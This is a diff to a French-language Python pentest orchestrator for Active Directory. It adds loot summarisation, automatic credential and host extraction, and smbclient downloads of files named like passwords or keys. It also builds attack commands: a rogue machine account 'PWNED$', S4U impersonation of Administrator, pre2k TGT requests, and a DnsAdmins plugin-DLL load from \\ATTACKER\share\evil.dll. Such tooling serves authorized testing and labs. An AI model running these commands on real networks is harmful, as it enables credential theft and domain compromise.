+        add("current_state", f"Faiblesse détectée: {item.get('text','')}", item.get("path", ""))
+    for item in bh_review_items[:2]:
+        add("current_state", f"BloodHound auto-review: {item.get('text','')}", item.get("path", ""))
+    for item in loot_hunt_items[:2]:
+        add("current_state", f"Fichier looté suspect: {item.get('path','')}", item.get("path", ""))
 
     # ════════════════════════════════════════════════════════════════════════
     # DECISION NOW
@@ -2148,6 +2886,12 @@ def collect_operational_view(out_dir: Path, domain: str, summary: dict) -> dict:
         add("warnings", "Responder a déjà échoué faute de privilèges root dans les anciens runs — relancer après mise à jour du backend.")
     for _err in ntlmrelay_errors[:2]:
         add("warnings", f"ntlmrelayx: {_err}.")
+    for item in anomaly_items[:3]:
+        if item.get("severity") in {"critical", "high"}:
+            add("warnings", f"Faiblesse forte: {item.get('text','')}", item.get("path", ""))
+    for item in loot_hunt_items[:3]:
+        if item.get("severity") in {"critical", "high"}:
+            add("warnings", f"Fichier à revoir d'urgence: {item.get('path','')}", item.get("path", ""))
 
     # ════════════════════════════════════════════════════════════════════════
     # TARGET ACCOUNTS
@@ -2232,6 +2976,14 @@ def collect_operational_view(out_dir: Path, domain: str, summary: dict) -> dict:
         add("priorities", "Coercition confirmée + SMB signing non requis — enchaîner directement sur Responder ou ntlmrelayx.")
     if bloodhound_gc_issue:
         add("priorities", "BloodHound n'est pas la voie rapide ici — privilégier BloodyAD, LDAP ciblé, Certipy et relay NTLM.")
+    for item in anomaly_items[:4]:
+        if item.get("severity") in {"critical", "high"}:
+            add("priorities", f"Anomalie exploitable: {item.get('text','')}", item.get("path", ""))
+    for item in bh_review_items[:3]:
+        if item.get("severity") in {"high", "critical", "medium"}:
+            add("priorities", f"BloodHound auto: {item.get('text','')}", item.get("path", ""))
+    for item in loot_hunt_items[:4]:
+        add("priorities", f"Analyser {item.get('path','')} ({item.get('severity','medium')})", item.get("path", ""))
 
     # ════════════════════════════════════════════════════════════════════════
     # ATTACK PATHS
@@ -2293,6 +3045,10 @@ def collect_operational_view(out_dir: Path, domain: str, summary: dict) -> dict:
         add("attack_paths", f"DnsAdmins ({_dns_u}) → dnscmd /config /serverlevelplugindll \\\\ATTACKER\\share\\evil.dll → SYSTEM DNS.")
     if bh_zip:
         add("attack_paths", f"BloodHound ZIP ({bh_zip[0].name}) → importer GUI → Shortest Paths to Domain Admins.")
+    elif bh_review_items:
+        add("attack_paths", "BloodHound offline a remonté plusieurs signaux, mais les shortest paths multi-sauts nécessitent toujours la GUI/Neo4j.", bh_review_items[0].get("path", ""))
+    if loot_hunt_items:
+        add("attack_paths", f"Les fichiers lootés montrent des indices sensibles ; commencer par {loot_hunt_items[0].get('path','')}.", loot_hunt_items[0].get("path", ""))
 
     # ════════════════════════════════════════════════════════════════════════
     # NEXT COMMANDS
@@ -2441,6 +3197,7 @@ def build_results_layout(summary: dict, contexts: list[str]) -> dict:
             "stats": True,
             "categories": any_cat,
             "interesting": bool(summary.get("interesting")),
+            "anomalies": bool(summary.get("anomalies")),
             "users": bool(summary.get("user_profiles")) or (summary.get("users", 0) > 0),
             "groups": bool(summary.get("group_profiles")) or (summary.get("groups", 0) > 0),
             "operational": has_ops(),
@@ -2557,6 +3314,10 @@ def summarize_domain_results(domain: str) -> dict:
         "adcs_esc": [],
         "auth_mode": "—",
         "interesting": [],
+        "anomalies": [],
+        "anomaly_stats": {},
+        "bloodhound_review": [],
+        "loot_hunt": [],
         "parsed_count": 0,
         "categories": {},
         "machines": [],
@@ -2567,6 +3328,7 @@ def summarize_domain_results(domain: str) -> dict:
         "contexts": [],
         "layout": {"contexts": [], "sections": {}, "stats": {}},
         "loot_analysis": {},
+        "loot_intel": {"credentials": [], "hosts": [], "findings": []},
     }
     if not out_dir.exists():
         return summary
@@ -2583,7 +3345,9 @@ def summarize_domain_results(domain: str) -> dict:
                 "source_files": int(loot_analysis.get("source_files", 0) or 0),
                 "interesting_files": int(loot_analysis.get("interesting_files", 0) or 0),
                 "artifacts": len(loot_analysis.get("artifacts", []) or []),
+                "auto_creds_added": int(loot_analysis.get("auto_creds_added", 0) or 0),
             }
+            summary["loot_intel"] = loot_analysis.get("loot_intel") or {"credentials": [], "hosts": [], "findings": []}
         except Exception:
             pass
 
@@ -2756,6 +3520,48 @@ def summarize_domain_results(domain: str) -> dict:
         if kept:
             interesting.append(f"{label}: " + " | ".join(kept))
 
+    summary["anomalies"] = normalize_loot_item_paths(out_dir, collect_directory_anomalies(out_dir))
+    loot_intel_findings = normalize_loot_item_paths(out_dir, (summary.get("loot_intel") or {}).get("findings") or [])
+    summary["anomalies"].extend(loot_intel_findings[:8])
+    summary["anomaly_stats"] = {
+        sev: sum(1 for item in summary["anomalies"] if item.get("severity") == sev)
+        for sev in ("critical", "high", "medium", "low")
+    }
+    summary["bloodhound_review"] = normalize_loot_item_paths(out_dir, collect_bloodhound_auto_review(out_dir))
+    summary["loot_hunt"] = normalize_loot_item_paths(out_dir, collect_looted_file_review(out_dir))
+    for item in summary["loot_hunt"][:3]:
+        summary["anomalies"].append({
+            "title": item.get("title", ""),
+            "text": item.get("title", ""),
+            "path": item.get("path", ""),
+            "severity": item.get("severity", "medium"),
+            "why": item.get("why", ""),
+            "impact": item.get("impact", ""),
+            "evidence": item.get("evidence", ""),
+        })
+    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
+    summary["anomalies"] = sorted(
+        summary["anomalies"],
+        key=lambda item: (order.get(item.get("severity", "medium"), 9), item.get("text", ""))
+    )[:18]
+    summary["anomaly_stats"] = {
+        sev: sum(1 for item in summary["anomalies"] if item.get("severity") == sev)
+        for sev in ("critical", "high", "medium", "low")
+    }
+    for item in summary["anomalies"][:5]:
+        interesting.append("Faiblesse: " + str(item.get("text", "")))
+    for item in summary["bloodhound_review"][:4]:
+        interesting.append("BloodHound auto: " + str(item.get("text", "")))
+    for item in summary["loot_hunt"][:3]:
+        interesting.append("Fichier suspect: " + str(item.get("path", "")))
+    for item in ((summary.get("loot_intel") or {}).get("credentials") or [])[:3]:
+        cred_text = f"{item.get('user','?')} / {item.get('pass','').strip()[:40]}"
+        src = item.get("path", "")
+        interesting.append(f"Credential extrait du loot: {cred_text}" + (f" ({src})" if src else ""))
+    for item in ((summary.get("loot_intel") or {}).get("hosts") or [])[:3]:
+        host = item.get("host") or item.get("ip") or "?"
+        src = item.get("path", "")
+        interesting.append(f"Hôte interne extrait du loot: {host}" + (f" ({src})" if src else ""))
     if len(interesting) > 20:
         interesting = interesting[:20]
     summary["interesting"] = interesting
@@ -2765,7 +3571,49 @@ def summarize_domain_results(domain: str) -> dict:
     summary["group_profiles"] = collect_group_profiles(out_dir)
     if summary["groups"] == 0 and summary["group_profiles"]:
         summary["groups"] = len(summary["group_profiles"])
-    summary["detail_sections"] = collect_detail_sections(out_dir)
+    detail_sections = normalize_loot_section_paths(out_dir, collect_detail_sections(out_dir))
+    if summary["anomalies"]:
+        detail_sections.insert(0, {
+            "key": "anomalies",
+            "title": "Anomalies & faiblesses",
+            "items": summary["anomalies"][:10],
+        })
+    if summary["bloodhound_review"]:
+        detail_sections.insert(1 if summary["anomalies"] else 0, {
+            "key": "bloodhound_auto",
+            "title": "BloodHound auto-review",
+            "items": summary["bloodhound_review"][:10],
+        })
+    if summary["loot_hunt"]:
+        insert_at = 2 if summary["anomalies"] and summary["bloodhound_review"] else (1 if (summary["anomalies"] or summary["bloodhound_review"]) else 0)
+        detail_sections.insert(insert_at, {
+            "key": "loot_hunt",
+            "title": "Fichiers lootés suspects",
+            "items": summary["loot_hunt"][:10],
+        })
+    loot_intel_items: list[dict] = []
+    for cred in ((summary.get("loot_intel") or {}).get("credentials") or [])[:6]:
+        path = str(cred.get("path", "") or "")
+        loot_intel_items.append({
+            "text": f"Credential extrait: {cred.get('user','?')} / {cred.get('pass','').strip()[:60]}",
+            "path": path,
+        })
+    for host in ((summary.get("loot_intel") or {}).get("hosts") or [])[:6]:
+        path = str(host.get("path", "") or "")
+        target = host.get("host") or host.get("ip") or "?"
+        info = str(host.get("info", "") or "").strip()
+        loot_intel_items.append({
+            "text": f"Hôte extrait: {target}" + (f" [{info}]" if info else ""),
+            "path": path,
+        })
+    if loot_intel_items:
+        insert_at = 3 if summary["anomalies"] or summary["bloodhound_review"] or summary["loot_hunt"] else 0
+        detail_sections.insert(insert_at, {
+            "key": "loot_intel",
+            "title": "Intel extrait des logs",
+            "items": loot_intel_items[:12],
+        })
+    summary["detail_sections"] = normalize_loot_section_paths(out_dir, detail_sections)
     summary["operational"] = collect_operational_view(out_dir, domain, summary)
     summary["contexts"] = detect_loot_contexts(out_dir, summary)
     summary["layout"] = build_results_layout(summary, summary["contexts"])
@@ -2849,6 +3697,8 @@ def analyze_loot_artifacts(domain: str) -> dict:
     }
     preview_chunks: list[str] = []
     artifacts: list[str] = []
+    loot_intel = extract_loot_structured_intel(out_dir)
+    auto_creds_added = merge_auto_creds(out_dir, loot_intel.get("credentials") or [])
 
     candidates = sorted(
         (f for f in out_dir.rglob("*") if _should_auto_analyze_file(f) and f.stat().st_size > 0),
@@ -2914,6 +3764,8 @@ def analyze_loot_artifacts(domain: str) -> dict:
             "errors": aggregate["errors"][:20],
         },
         "artifacts": artifacts[:200],
+        "loot_intel": loot_intel,
+        "auto_creds_added": auto_creds_added,
         "output_preview": "\n\n".join(preview_chunks)[:MAX_CAPTURE_CHARS],
         "updated_at": analysis["updated_at"],
     }
@@ -3116,7 +3968,7 @@ def normalize_cfg(cfg: dict) -> dict:
         cleaned[key] = val
     cleaned["ui_language"] = cleaned["ui_language"] if cleaned["ui_language"] in {"fr", "en"} else "fr"
     cleaned["target_type"] = cleaned["target_type"] if cleaned["target_type"] in {"windows", "linux", "web", "hybrid"} else "windows"
-    cleaned["op_mode"] = cleaned["op_mode"] if cleaned["op_mode"] in {"safe", "htb", "enterprise"} else "safe"
+    cleaned["op_mode"] = cleaned["op_mode"] if cleaned["op_mode"] in ENABLED_OP_MODES else DEFAULT_OP_MODE
     # Ports
     wp = str(cfg.get("web_port", "") or "").strip()
     cleaned["web_port"] = wp if (wp.isdigit() and 1 <= int(wp) <= 65535) else "80"
@@ -3140,6 +3992,45 @@ def resolve_loot_path(rel_path: str) -> Path:
     if not candidate.is_relative_to(loot_root):
         raise ValueError("chemin hors loot/")
     return candidate
+
+
+def normalize_loot_rel_path(out_dir: Path, rel_path: str) -> str:
+    rel = str(rel_path or "").replace("\x00", "").replace("\\", "/").strip().lstrip("/")
+    if not rel:
+        return ""
+    try:
+        domain_root = str(out_dir.relative_to(LOOT_DIR)).replace("\\", "/").strip("/")
+    except Exception:
+        domain_root = ""
+    if not domain_root:
+        return rel
+    if rel == domain_root or rel.startswith(domain_root + "/"):
+        return rel
+    return f"{domain_root}/{rel}"
+
+
+def normalize_loot_item_paths(out_dir: Path, items: list) -> list:
+    normalized: list = []
+    for item in items or []:
+        if isinstance(item, dict):
+            fixed = dict(item)
+            if fixed.get("path"):
+                fixed["path"] = normalize_loot_rel_path(out_dir, str(fixed.get("path", "")))
+            normalized.append(fixed)
+        else:
+            normalized.append(item)
+    return normalized
+
+
+def normalize_loot_section_paths(out_dir: Path, sections: list[dict]) -> list[dict]:
+    normalized: list[dict] = []
+    for section in sections or []:
+        if not isinstance(section, dict):
+            continue
+        fixed = dict(section)
+        fixed["items"] = normalize_loot_item_paths(out_dir, fixed.get("items", []) or [])
+        normalized.append(fixed)
+    return normalized
 
 # ── Map tool_id → fonction du script ──────────────────────────────────
 SCRIPT_PHASES = {
@@ -3672,12 +4563,215 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
         # ── SMB ─────────────────────────────────────────────────────────
         "smbmap_enum": ["bash","-c",
             f"command -v smbmap >/dev/null || {{ echo 'smbmap manquant'; exit 1; }}; "
+            f"command -v smbclient >/dev/null || echo 'smbclient manquant: downloads SMB limites'; "
             f"mkdir -p {qout}/downloads; "
-            + (f"smbmap -H {qt} -u {qu} "
+            + (f"OUTFILE={qout}/downloads/smbmap_enum.txt; "
+               f"smbmap -H {qt} -u {qu} "
                + (f"-p {shell_quote(':' + nt)} --pth" if nt else f"-p {qp}")
-               + f" -d {qd} -r --depth 3 2>&1 | tee {qout}/downloads/smbmap_enum.txt"
+               + f" -d {qd} -r --depth 3 2>&1 | tee \"$OUTFILE\"; "
+               + (f"echo '[*] Downloads auto ignores: auth NT hash/PTH non reutilisable via smbclient.'"
+                  if nt else
+                  f"python3 - <<'PY' \"$OUTFILE\" {qt} {shell_quote(u)} {qp} {qd} {qout}/downloads/smbmap_loot\n"
+                  "import pathlib, re, shlex, shutil, subprocess, sys\n"
+                  "out_file = pathlib.Path(sys.argv[1])\n"
+                  "target = sys.argv[2]\n"
+                  "user = sys.argv[3]\n"
+                  "password = sys.argv[4]\n"
+                  "domain = sys.argv[5]\n"
+                  "download_root = pathlib.Path(sys.argv[6])\n"
+                  "download_root.mkdir(parents=True, exist_ok=True)\n"
+                  "text = out_file.read_text(errors='replace') if out_file.exists() else ''\n"
+                  "cur_share = None\n"
+                  "current_dir = ''\n"
+                  "candidates = []\n"
+                  "ext_re = re.compile(r'\\.(?:txt|log|ini|conf|config|xml|json|ya?ml|ps1|bat|cmd|vbs|kdbx|rdp|ppk|pem|key|db|sqlite|db3|bak|old|backup|sav|zip|7z|rar|tar|gz)$', re.I)\n"
+                  "name_re = re.compile(r'(?:password|secret|credential|creds?|config|settings|backup|database)', re.I)\n"
+                  "for raw in text.splitlines():\n"
+                  "    line = raw.rstrip()\n"
+                  "    scan = line.strip()\n"
+                  "    m_share = re.match(r'^([A-Za-z0-9$._ -]+?)\\s+(?:READ ONLY|READ,WRITE|READ WRITE|WRITE ONLY|NO ACCESS)\\b', scan)\n"
+                  "    if m_share:\n"
+                  "        cur_share = m_share.group(1).strip()\n"
+                  "        current_dir = ''\n"
+                  "        continue\n"
+                  "    if scan.startswith('./') and cur_share:\n"
+                  "        shown = scan[2:].strip().replace('//', '/')\n"
+                  "        shown = shown.strip('/')\n"
+                  "        if shown.lower() == cur_share.lower():\n"
+                  "            current_dir = ''\n"
+                  "        elif shown.lower().startswith(cur_share.lower() + '/'):\n"
+                  "            current_dir = shown[len(cur_share):].lstrip('/')\n"
+                  "        else:\n"
+                  "            current_dir = shown\n"
+                  "        continue\n"
+                  "    if not cur_share:\n"
+                  "        continue\n"
+                  "    if re.search(r'\\b(fr|f)--', scan):\n"
+                  "        parts = scan.split()\n"
+                  "        if not parts:\n"
+                  "            continue\n"
+                  "        name = parts[-1].strip()\n"
+                  "        if not name or name in {'.', '..'}:\n"
+                  "            continue\n"
+                  "        if ext_re.search(name) or name_re.search(name):\n"
+                  "            rel_dir = current_dir\n"
+                  "            rel_path = f'{rel_dir}/{name}'.strip('/')\n"
+                  "            item = (cur_share, rel_path)\n"
+                  "            if item not in candidates:\n"
+                  "                candidates.append(item)\n"
+                  "print('=== smbmap auto-download candidates ===')\n"
+                  "downloaded = 0\n"
+                  "for share, rel_path in candidates[:20]:\n"
+                  "    print(f'[candidate] {share}/{rel_path}')\n"
+                  "    if shutil.which('smbclient') is None:\n"
+                  "        continue\n"
+                  "PY\n"
+                  f"python3 - <<'PY' \"$OUTFILE\" {qt} {shell_quote(u)} {qp} {qd} {qout}/downloads/smbmap_loot\n"
+                  "import pathlib, re, shlex, shutil, subprocess, sys\n"
+                  "out_file = pathlib.Path(sys.argv[1])\n"
+                  "target = sys.argv[2]\n"
+                  "user = sys.argv[3]\n"
+                  "password = sys.argv[4]\n"
+                  "domain = sys.argv[5]\n"
+                  "download_root = pathlib.Path(sys.argv[6])\n"
+                  "download_root.mkdir(parents=True, exist_ok=True)\n"
+                  "text = out_file.read_text(errors='replace') if out_file.exists() else ''\n"
+                  "cur_share = None\n"
+                  "current_dir = ''\n"
+                  "candidates = []\n"
+                  "ext_re = re.compile(r'\\.(?:txt|log|ini|conf|config|xml|json|ya?ml|ps1|bat|cmd|vbs|kdbx|rdp|ppk|pem|key|db|sqlite|db3|bak|old|backup|sav|zip|7z|rar|tar|gz)$', re.I)\n"
+                  "name_re = re.compile(r'(?:password|secret|credential|creds?|config|settings|backup|database)', re.I)\n"
+                  "for raw in text.splitlines():\n"
+                  "    line = raw.rstrip()\n"
+                  "    scan = line.strip()\n"
+                  "    m_share = re.match(r'^([A-Za-z0-9$._ -]+?)\\s+(?:READ ONLY|READ,WRITE|READ WRITE|WRITE ONLY|NO ACCESS)\\b', scan)\n"
+                  "    if m_share:\n"
+                  "        cur_share = m_share.group(1).strip()\n"
+                  "        current_dir = ''\n"
+                  "        continue\n"
+                  "    if scan.startswith('./') and cur_share:\n"
+                  "        shown = scan[2:].strip().replace('//', '/')\n"
+                  "        shown = shown.strip('/')\n"
+                  "        if shown.lower() == cur_share.lower():\n"
+                  "            current_dir = ''\n"
+                  "        elif shown.lower().startswith(cur_share.lower() + '/'):\n"
+                  "            current_dir = shown[len(cur_share):].lstrip('/')\n"
+                  "        else:\n"
+                  "            current_dir = shown\n"
+                  "        continue\n"
+                  "    if not cur_share:\n"
+                  "        continue\n"
+                  "    if re.search(r'\\b(fr|f)--', scan):\n"
+                  "        parts = scan.split()\n"
+                  "        if not parts:\n"
+                  "            continue\n"
+                  "        name = parts[-1].strip()\n"
+                  "        if not name or name in {'.', '..'}:\n"
+                  "            continue\n"
+                  "        if ext_re.search(name) or name_re.search(name):\n"
+                  "            rel_dir = current_dir\n"
+                  "            rel_path = f'{rel_dir}/{name}'.strip('/')\n"
+                  "            item = (cur_share, rel_path)\n"
+                  "            if item not in candidates:\n"
+                  "                candidates.append(item)\n"
+                  "if shutil.which('smbclient') is None:\n"
+                  "    print('[*] smbclient absent: impossible de telecharger les fichiers candidats.')\n"
+                  "    raise SystemExit(0)\n"
+                  "downloaded = 0\n"
+                  "for share, rel_path in candidates[:20]:\n"
+                  "    share_dir = download_root / share\n"
+                  "    share_dir.mkdir(parents=True, exist_ok=True)\n"
+                  "    remote_dir = '/'.join(rel_path.split('/')[:-1])\n"
+                  "    remote_name = rel_path.split('/')[-1]\n"
+                  "    cmd = f'prompt OFF; recurse OFF; lcd \"{share_dir}\"; '\n"
+                  "    if remote_dir:\n"
+                  "        cmd += f'cd \"{remote_dir}\"; '\n"
+                  "    cmd += f'get \"{remote_name}\"'\n"
+                  "    base = ['smbclient', f'//{target}/{share}', '-U', f'{user}%{password}', '-W', domain, '-c', cmd]\n"
+                  "    try:\n"
+                  "        proc = subprocess.run(base, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=25)\n"
+                  "        if proc.returncode == 0:\n"
+                  "            downloaded += 1\n"
+                  "            print(f'[downloaded] {share}/{rel_path}')\n"
+                  "        else:\n"
+                  "            print(f'[skip] {share}/{rel_path} :: {proc.stdout[:120].strip()}')\n"
+                  "    except Exception as exc:\n"
+                  "        print(f'[skip] {share}/{rel_path} :: {str(exc)[:120]}')\n"
+                  "print(f'[summary] downloaded={downloaded} candidates={min(len(candidates),20)} root={download_root}')\n"
+                  "PY")
                if u else
-               f"smbmap -H {qt} -u '' -p '' -r --depth 2 2>&1 | tee {qout}/downloads/smbmap_anon.txt")
+               f"OUTFILE={qout}/downloads/smbmap_anon.txt; "
+               f"smbmap -H {qt} -u '' -p '' -r --depth 2 2>&1 | tee \"$OUTFILE\"; "
+               f"python3 - <<'PY' \"$OUTFILE\" {qt} {qout}/downloads/smbmap_loot_anon\n"
+               "import pathlib, re, shutil, subprocess, sys\n"
+               "out_file = pathlib.Path(sys.argv[1])\n"
+               "target = sys.argv[2]\n"
+               "download_root = pathlib.Path(sys.argv[3])\n"
+               "download_root.mkdir(parents=True, exist_ok=True)\n"
+               "text = out_file.read_text(errors='replace') if out_file.exists() else ''\n"
+               "cur_share = None\n"
+               "current_dir = ''\n"
+               "candidates = []\n"
+               "ext_re = re.compile(r'\\.(?:txt|log|ini|conf|config|xml|json|ya?ml|ps1|bat|cmd|vbs)$', re.I)\n"
+               "name_re = re.compile(r'(?:password|secret|credential|creds?|config|settings)', re.I)\n"
+               "for raw in text.splitlines():\n"
+               "    line = raw.rstrip()\n"
+               "    scan = line.strip()\n"
+               "    m_share = re.match(r'^([A-Za-z0-9$._ -]+?)\\s+(?:READ ONLY|READ,WRITE|READ WRITE|WRITE ONLY|NO ACCESS)\\b', scan)\n"
+               "    if m_share:\n"
+               "        cur_share = m_share.group(1).strip()\n"
+               "        current_dir = ''\n"
+               "        continue\n"
+               "    if scan.startswith('./') and cur_share:\n"
+               "        shown = scan[2:].strip().replace('//', '/')\n"
+               "        shown = shown.strip('/')\n"
+               "        if shown.lower() == cur_share.lower():\n"
+               "            current_dir = ''\n"
+               "        elif shown.lower().startswith(cur_share.lower() + '/'):\n"
+               "            current_dir = shown[len(cur_share):].lstrip('/')\n"
+               "        else:\n"
+               "            current_dir = shown\n"
+               "        continue\n"
+               "    if not cur_share:\n"
+               "        continue\n"
+               "    if re.search(r'\\b(fr|f)--', scan):\n"
+               "        parts = scan.split()\n"
+               "        if not parts:\n"
+               "            continue\n"
+               "        name = parts[-1].strip()\n"
+               "        if not name or name in {'.', '..'}:\n"
+               "            continue\n"
+               "        if ext_re.search(name) or name_re.search(name):\n"
+               "            rel_dir = current_dir\n"
+               "            rel_path = f'{rel_dir}/{name}'.strip('/')\n"
+               "            item = (cur_share, rel_path)\n"
+               "            if item not in candidates:\n"
+               "                candidates.append(item)\n"
+               "if shutil.which('smbclient') is None:\n"
+               "    print('[*] smbclient absent: impossible de telecharger les fichiers candidats.')\n"
+               "    raise SystemExit(0)\n"
+               "downloaded = 0\n"
+               "for share, rel_path in candidates[:12]:\n"
+               "    share_dir = download_root / share\n"
+               "    share_dir.mkdir(parents=True, exist_ok=True)\n"
+               "    remote_dir = '/'.join(rel_path.split('/')[:-1])\n"
+               "    remote_name = rel_path.split('/')[-1]\n"
+               "    cmd = f'prompt OFF; recurse OFF; lcd \"{share_dir}\"; '\n"
+               "    if remote_dir:\n"
+               "        cmd += f'cd \"{remote_dir}\"; '\n"
+               "    cmd += f'get \"{remote_name}\"'\n"
+               "    base = ['smbclient', f'//{target}/{share}', '-N', '-c', cmd]\n"
+               "    try:\n"
+               "        proc = subprocess.run(base, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=20)\n"
+               "        if proc.returncode == 0:\n"
+               "            downloaded += 1\n"
+               "            print(f'[downloaded] {share}/{rel_path}')\n"
+               "        else:\n"
+               "            print(f'[skip] {share}/{rel_path} :: {proc.stdout[:120].strip()}')\n"
+               "    except Exception as exc:\n"
+               "        print(f'[skip] {share}/{rel_path} :: {str(exc)[:120]}')\n"
+               "print(f'[summary] downloaded={downloaded} candidates={min(len(candidates),12)} root={download_root}')\n"
+               "PY")
         ] if t else None,
 
         # ── Web ──────────────────────────────────────────────────────────
@@ -3748,10 +4842,11 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
             f"[ -z \"$TOOL\" ] && echo 'dacledit.py introuvable — impacket récent requis' && exit 1; "
             f"TOOL=\"python3 $TOOL\"; }}; "
             f"mkdir -p {qout}/attack_checks; "
-            + (f"$TOOL "
-               + (f"-hashes :{shell_quote(nt)}" if nt else f"-p {qp}")
-               + f" -dc-ip {qt} -principal {qu} -target-dn {qdn} "
-               f"{shell_quote(f'{d}/{u}')} 2>&1 | tee {qout}/attack_checks/dacledit.txt"
+            + (f"$TOOL -action read -dc-ip {qt} -principal {qu} -target-dn {qdn} "
+               + (f"-hashes {shell_quote(':' + nt)} {shell_quote(f'{d}/{u}')}" if nt else
+                  f"-k -no-pass {shell_quote(f'{d}/{u}')}" if cc else
+                  f"{shell_quote(f'{d}/{u}:{p}')}")
+               + f" 2>&1 | tee {qout}/attack_checks/dacledit.txt"
                if u and dn else "echo 'User et DN de base requis'")
         ] if t and d else None,
 
@@ -3762,10 +4857,11 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
             f"[ -z \"$TOOL\" ] && echo 'owneredit.py introuvable — impacket récent requis' && exit 1; "
             f"TOOL=\"python3 $TOOL\"; }}; "
             f"mkdir -p {qout}/attack_checks; "
-            + (f"$TOOL -action read "
-               + (f"-hashes :{shell_quote(nt)}" if nt else f"-p {qp}")
-               + f" -dc-ip {qt} -target {qu} "
-               f"{shell_quote(f'{d}/{u}')} 2>&1 | tee {qout}/attack_checks/owneredit.txt"
+            + (f"$TOOL -action read -dc-ip {qt} -target {qu} "
+               + (f"-hashes {shell_quote(':' + nt)} {shell_quote(f'{d}/{u}')}" if nt else
+                  f"-k -no-pass {shell_quote(f'{d}/{u}')}" if cc else
+                  f"{shell_quote(f'{d}/{u}:{p}')}")
+               + f" 2>&1 | tee {qout}/attack_checks/owneredit.txt"
                if u else "echo 'Credentials requis'")
         ] if t and d else None,
 
@@ -3773,10 +4869,11 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
             f"TOOL={shell_quote(get_impacket('addcomputer'))}; "
             f"command -v $TOOL >/dev/null || {{ echo 'impacket-addcomputer introuvable'; exit 1; }}; "
             f"mkdir -p {qout}/attack_checks; "
-            + (f"$TOOL "
-               + (f"-hashes :{shell_quote(nt)}" if nt else f"-p {qp}")
-               + f" -dc-ip {qt} -computer-name 'PWNED$' -computer-pass 'Pwned123!' "
-               f"{shell_quote(f'{d}/{u}')} 2>&1 | tee {qout}/attack_checks/addcomputer.txt; "
+            + (f"$TOOL -dc-ip {qt} -computer-name 'PWNED$' -computer-pass 'Pwned123!' "
+               + (f"-hashes {shell_quote(':' + nt)} {shell_quote(f'{d}/{u}')}" if nt else
+                  f"-k -no-pass {shell_quote(f'{d}/{u}')}" if cc else
+                  f"{shell_quote(f'{d}/{u}:{p}')}")
+               + f" 2>&1 | tee {qout}/attack_checks/addcomputer.txt; "
                f"echo ''; echo '[*] Utilise PWNED$ / Pwned123! pour RBCD ou Shadow Creds'"
                if u else "echo 'Credentials requis'")
         ] if t and d else None,
@@ -4121,21 +5218,28 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
 
         # ── Post-auth HTB specific ────────────────────────────────────────
         "pre2k_check": ["bash","-c",
-            f"mkdir -p {qout}/attack_checks; "
-            f"echo '=== nxc ldap --pre2k (comptes machine pré-W2000) ==='; "
-            f"{shell_quote(nxc)} ldap {qt} "
-            + (f"-u {qu} " + (f"-H {qnt}" if nt else f"-p {qp}") + f" -d {qd}" if u else f"-u '' -p ''")
-            + f" --pre2k 2>&1 | tee {qout}/attack_checks/pre2k.txt; "
-            f"echo ''; "
-            f"if command -v pre2k >/dev/null; then "
-            f"  echo '=== tool pre2k (scan unauthenticated) ==='; "
-            f"  pre2k unauth -d {qd} -dc-ip {qt} 2>&1 | tee -a {qout}/attack_checks/pre2k.txt; "
-            f"else "
-            f"  echo '[*] Tool pre2k absent, mais la vérification NXC --pre2k a bien été lancée.' | tee -a {qout}/attack_checks/pre2k.txt; "
+            f"mkdir -p {qout}/attack_checks; OUT={qout}/attack_checks/pre2k.txt; : > \"$OUT\"; "
+            f"echo '=== pre2k detection — comptes machine pré-W2000 ===' | tee -a \"$OUT\"; "
+            # 1) LDAP authentifié : recherche des computer accounts suspects (logonCount=0, pwdLastSet=0)
+            + (f"echo '--- ldapsearch : computer accounts avec logonCount=0 et pwdLastSet=0 ---' | tee -a \"$OUT\"; "
+               f"ldapsearch -x -LLL -H ldap://{qt} {ldap_bind()} -b {qdn} "
+               f"'(&(objectCategory=computer)(logonCount=0)(pwdLastSet=0))' "
+               f"sAMAccountName dNSHostName userAccountControl whenCreated 2>&1 "
+               f"| tee -a \"$OUT\"; echo '' | tee -a \"$OUT\"; "
+               if u else "")
+            # 2) Outil pre2k si installé (mode authentifié si creds dispo, sinon unauth)
+            + f"if command -v pre2k >/dev/null 2>&1; then "
+            f"  echo '=== pre2k tool ===' | tee -a \"$OUT\"; "
+            + (f"  pre2k auth -u {qu} -p {qp} -d {qd} -dc-ip {qt} 2>&1 | tee -a \"$OUT\"; "
+               if u and p and not nt else
+               f"  pre2k unauth -d {qd} -dc-ip {qt} 2>&1 | tee -a \"$OUT\"; ")
+            + f"else "
+            f"  echo '[*] Outil pre2k absent (pip install pre2k ou https://github.com/garrettfoster13/pre2k)' | tee -a \"$OUT\"; "
             f"fi; "
-            f"echo ''; echo '--- Pattern : password = hostname en minuscules sans $ ---'; "
-            f"echo '--- Ex: MS01$ → mot de passe = ms01 ---'; "
-            f"echo '--- Exploit : impacket-getTGT DOMAIN/MS01\\$:ms01 -dc-ip {t} ---'"
+            f"echo '' | tee -a \"$OUT\"; "
+            f"echo '--- Pattern : password = hostname en minuscules sans $ ---' | tee -a \"$OUT\"; "
+            f"echo '--- Ex: MS01$ → mot de passe = ms01 ---' | tee -a \"$OUT\"; "
+            f"echo '--- Exploit : impacket-getTGT {d}/MS01\\$:ms01 -dc-ip {t} ---' | tee -a \"$OUT\""
         ] if t and d else None,
 
         "gmsa_extract": ["bash","-c",
@@ -4179,12 +5283,13 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
                f"echo '[!] Remplace SPN_TARGET par le SPN cible (ex: http/WEB01.{_dom}) et IMPERSONATE par le compte a usurper'; "
                f"SPN_TARGET='http/TARGET.{_dom}'; "
                f"IMPERSONATE='Administrator'; "
-               + (f"KRB5CCNAME={qcc} $TOOL -spn $SPN_TARGET -impersonate $IMPERSONATE "
-                  f"-k -no-pass {shell_quote(f'{d}/{u}')} -dc-ip {qt} 2>&1"
+               + (f"KRB5CCNAME={qcc} $TOOL -spn \"$SPN_TARGET\" -impersonate \"$IMPERSONATE\" "
+                  f"-k -no-pass -dc-ip {qt} {shell_quote(f'{d}/{u}')} 2>&1"
                   if cc else
-                  f"$TOOL -spn $SPN_TARGET -impersonate $IMPERSONATE "
